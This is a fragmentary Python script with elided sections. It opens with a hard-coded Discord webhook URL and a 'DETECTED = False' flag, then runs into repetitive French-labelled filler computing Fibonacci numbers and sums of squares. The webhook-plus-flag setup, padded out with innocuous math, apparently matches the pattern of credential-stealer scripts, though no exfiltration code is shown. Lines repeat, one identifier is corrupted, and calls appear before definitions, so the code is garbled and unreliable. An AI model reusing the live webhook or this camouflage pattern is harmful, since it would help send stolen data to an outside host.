...
hook = "https://discord.com/api/webhooks/1093262885930672148/uJ8tB_NZfbFsYNWSIKkUfSDnQJXz1Odn0edx0kZLWTPeZBeKia7V9MexcWYz1YmxboGe"
DETECTED = False
...
print("Résultat de Fibonacci pour n=10 :", fibonacci_result)
def fibonacci(n):
    if n <= 1:
        return n
    else:
...
print("Somme des carrés de 1 à 100 :", sum_of_squares)
...
sum_of_squares = sum(i**2 for i in range(1, 101))
print("Somme des carrés de 1 à 100 :", sum_of_squares)
varssum_of_squares = sum(i**2 for i in range(1, 101))
print("Somme des carrés de 1 à 100 :", sum_of_squares)
sum_of_squares = sum(i**2 for i in range(1, 101))
print("Somme des carrés de 1 à 100 :", sum_of_squares)
sum_of_squares = sum(i**2 for i in range(1, 101))
